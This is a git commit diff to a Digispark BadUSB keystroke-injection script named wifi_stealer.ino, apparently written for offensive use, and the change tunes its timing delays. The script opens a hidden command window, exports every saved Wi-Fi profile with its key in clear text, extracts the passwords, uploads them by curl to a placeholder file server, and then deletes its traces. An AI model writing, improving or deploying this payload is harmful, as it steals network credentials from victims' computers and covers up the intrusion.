368981d891b94a8f9ed700885e370b7d76308b66
Eden Frey <x3d3nfr3yx@rosewall.edensdigitalgarden.com>
2023-10-05 12:41:48 +0800

    Progress

--- scripts/wifi_stealer.ino
+++ scripts/wifi_stealer.ino
@@ -9,7 +9,7 @@ void loop() {
     
     /* Wi-FI Stealer */
     DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
-    DigiKeyboard.delay(100);
+    DigiKeyboard.delay(750);
     DigiKeyboard.println("cmd /k mode con: cols=15 lines=1");
     DigiKeyboard.delay(1000);
     DigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_ALT_LEFT);
@@ -19,19 +19,19 @@ void loop() {
         DigiKeyboard.sendKeyStroke(81);
         }
     DigiKeyboard.sendKeyStroke(KEY_ENTER); // Detach from scrolling
-    DigiKeyboard.delay(100);
+    DigiKeyboard.delay(750);
     DigiKeyboard.println("cd %temp%"); // Temporary directory
-    DigiKeyboard.delay(500);
+    DigiKeyboard.delay(750);
     DigiKeyboard.println("netsh wlan export profile key=clear"); // Grab all the saved WiFi passwords and saving in temperory directory
-    DigiKeyboard.delay(500);
+    DigiKeyboard.delay(750);
     DigiKeyboard.println("powershell Select-String -Path Wi*.xml -Pattern 'keyMaterial' > Wi-Fi-PASS");
-    DigiKeyboard.delay(500);
+    DigiKeyboard.delay(750);
     DigiKeyboard.println("curl -X POST [FILESERVER]/upload -F files=@Wi-Fi-PASS"); // Upload passwords file to server
     DigiKeyboard.delay(1000);
     DigiKeyboard.println("del Wi-* /s /f /q"); // Clean up
-    DigiKeyboard.delay(100);
+    DigiKeyboard.delay(750);
     DigiKeyboard.println("exit");
-    DigiKeyboard.delay(100);
+    DigiKeyboard.delay(750);
 
     for (;;) {
         /*Stops the digispark from running the scipt again*/
